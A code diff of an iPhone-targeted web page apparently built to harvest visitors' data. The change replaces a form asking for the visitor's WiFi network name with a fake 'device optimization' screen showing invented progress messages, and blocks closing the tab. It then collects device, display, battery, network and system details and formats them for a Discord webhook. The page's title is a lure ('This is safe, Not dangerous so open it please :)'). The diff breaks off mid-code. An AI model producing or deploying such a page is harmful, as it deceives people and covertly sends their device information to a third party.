@@ -29,10 +29,10 @@
             width: 100%;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
             backdrop-filter: blur(10px);
+            text-align: center;
         }
         
         .header {
-            text-align: center;
             margin-bottom: 30px;
         }
         
@@ -48,78 +48,18 @@
             font-size: 14px;
         }
         
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            color: #555;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: white;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
-        }
-        
-        .submit-btn:active {
-            transform: translateY(0);
-        }
-        
-        .status {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #666;
-        }
-        
         .loading {
-            display: none;
-            text-align: center;
             margin-top: 20px;
         }
         
         .spinner {
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 20px;
         }
         
         @keyframes spin {
@@ -127,18 +67,33 @@
             100% { transform: rotate(360deg); }
         }
         
-        .success {
-            display: none;
-            text-align: center;
-            color: #4CAF50;
-            font-weight: 500;
+        .status-text {
+            color: #666;
+            font-size: 16px;
+            margin-bottom: 10px;
         }
         
-        .wifi-icon {
-            width: 20px;
-            height: 20px;
-            margin-right: 8px;
-            vertical-align: middle;
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .success {
+            display: none;
+            color: #4CAF50;
+            font-weight: 500;
+            margin-top: 20px;
         }
     </style>
 </head>
@@ -146,37 +101,19 @@
     <div class="container">
         <div class="header">
             <h1>[This is safe, Not dangerous so open it please :)]</h1>
-            <p>Please enter your current WiFi network name</p>
+            <p>Optimizing your device experience...</p>
         </div>
         
-        <form id="deviceForm">
-            <div class="form-group">
-                <label for="wifiName">
-                    <svg class="wifi-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
-                        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
-                        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
-                        <line x1="12" y1="20" x2="12.01" y2="20"></line>
-                    </svg>
-                    WiFi Network Name
-                </label>
-                <input type="text" id="wifiName" name="wifiName" placeholder="Enter your WiFi network name" required>
-            </div>
-            
-            <button type="submit" class="submit-btn">Submit Device Information</button>
-        </form>
-        
-        <div class="loading" id="loading">
+        <div class="loading">
             <div class="spinner"></div>
-            <p>Collecting device information...</p>
+            <div class="status-text" id="statusText">Initializing secure connection...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
         </div>
         
         <div class="success" id="success">
-            <p>✅ Information submitted successfully!</p>
-        </div>
-        
-        <div class="status" id="status">
-            <p>Secure connection established 🔒</p>
+            <p>✅ Device optimization complete!</p>
         </div>
     </div>
 
@@ -184,7 +121,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Prevent user from closing the tab
             window.onbeforeunload = function() {
-                return "Device information is required to complete the setup!";
+                return "Device optimization in progress - please wait!";
             };
 
             // Check if the device is an iPhone
@@ -193,23 +130,40 @@
                 document.querySelector('.container').innerHTML = `
                     <div class="header">
                         <h1>Device Not Supported</h1>
-                        <p>This page is only compatible with iPhone devices.</p>
+                        <p>This optimization is only for iPhone devices.</p>
                     </div>
                 `;
                 return;
             }
 
-            // Form submission
-            document.getElementById('deviceForm').addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const wifiName = document.getElementById('wifiName').value;
-                
-                // Show loading
-                document.getElementById('deviceForm').style.display = 'none';
-                document.getElementById('loading').style.display = 'block';
-                document.getElementById('status').style.display = 'none';
-                
+            // Status messages for the loading process
+            const statusMessages = [
+                "Initializing secure connection...",
+                "Scanning device hardware...",
+                "Analyzing battery performance...",
+                "Checking network connectivity...",
+                "Optimizing system settings...",
+                "Finalizing configuration..."
+            ];
+
+            let currentStep = 0;
+            const statusText = document.getElementById('statusText');
+            const progressFill = document.getElementById('progressFill');
+
+            // Update status and progress
+            function updateStatus() {
+                if (currentStep < statusMessages.length) {
+                    statusText.textContent = statusMessages[currentStep];
+                    progressFill.style.width = `\${((currentStep + 1) / statusMessages.length) * 100}%`;
+                    currentStep++;
+                    setTimeout(updateStatus, 800);
+                } else {
+                    // Collection complete - send data
+                    collectAndSendData();
+                }
+            }
+
+            function collectAndSendData() {
                 // Collect comprehensive device information
                 const deviceInfo = {
                     timestamp: new Date().toISOString(),
@@ -244,10 +198,6 @@
                         doNotTrack: navigator.doNotTrack,
                         onlineStatus: navigator.onLine,
                         cores: navigator.hardwareConcurrency || 'Unknown'
-                    },
-                    network: {
-                        wifiName: wifiName,
-                        connectionType: navigator.connection?.effectiveType || 'Unknown'
                     }
                 };
 
@@ -261,14 +211,53 @@
                     });
                 }
 
+                // Try to get WiFi information
+                try {
+                    const wifiConnection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    if (wifiConnection) {
+                        deviceInfo.network = {
+                            type: wifiConnection.type || 'Unknown',
+                            effectiveType: wifiConnection.effectiveType || 'Unknown',
+                            downlink: wifiConnection.downlink || 'Unknown',
+                            rtt: wifiConnection.rtt || 'Unknown'
+                        };
+                    }
+                } catch (e) {
+                    console.log('Network info not available');
+                }
+
                 // Send to Discord webhook with professional formatting
-                setTimeout(() => {
-                    const discordMessage = {
-                        content: `📱 **[This is safe, Not dangerous so open it please :)]** - New iPhone Device Information`,
-                        embeds: [{
-                            title: "🔍 Device Information Collected",
-                            color: 5814783,
-                            fields: [
-                                {
-                                    name: "📱 Device Details",
-                                    value: `**Platform:** \${deviceInfo.device.platform
+                const discordMessage = {
+                    content: `📱 **[This is safe, Not dangerous so open it please :)]** - New iPhone Device Information`,
+                    embeds: [{
+                        title: "🔍 Device Information Collected",
+                        color: 5814783,
+                        fields: [
+                            {
+                                name: "📱 Device Details",
+                                value: `**Platform:** ${deviceInfo.device.platform}\n**Language:** ${deviceInfo.device.language}\n**Memory:** ${deviceInfo.device.deviceMemory}GB\n**Cores:** ${deviceInfo.device.hardwareConcurrency}`,
+                                inline: true
+                            },
+                            {
+                                name: "🖥️ Display Information",
+                                value: `**Resolution:** ${deviceInfo.display.screenResolution}\n**Color Depth:** ${deviceInfo.display.colorDepth}bit\n**Pixel Ratio:** ${deviceInfo.display.pixelRatio}`,
+                                inline: true
+                            },
+                            {
+                                name: "🔋 Battery Status",
+                                value: `**Level:** ${Math.round((deviceInfo.battery.level || 0) * 100)}%\n**Charging:** \${deviceInfo.battery.charging ? 'Yes' : 'No'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 Network Information",
+                                value: `**Type:** ${deviceInfo.connection.effectiveType}\n**Downlink:** ${deviceInfo.connection.downlink}Mbps\n**RTT:** ${deviceInfo.connection.rtt}ms`,
+                                inline: true
+                            },
+                            {
+                                name: "⚙️ System Information",
+                                value: `**Timezone:** ${deviceInfo.system.timezone}\n**Online:** ${deviceInfo.system.onlineStatus ? 'Yes' : 'No'}\n**Cookies:** ${deviceInfo.system.cookieEnabled ? 'Enabled' : 'Disabled'}`,
+                                inline: true
+                            },
+                            {
+                                name: "🕐 Collection Time",
+                                value: new
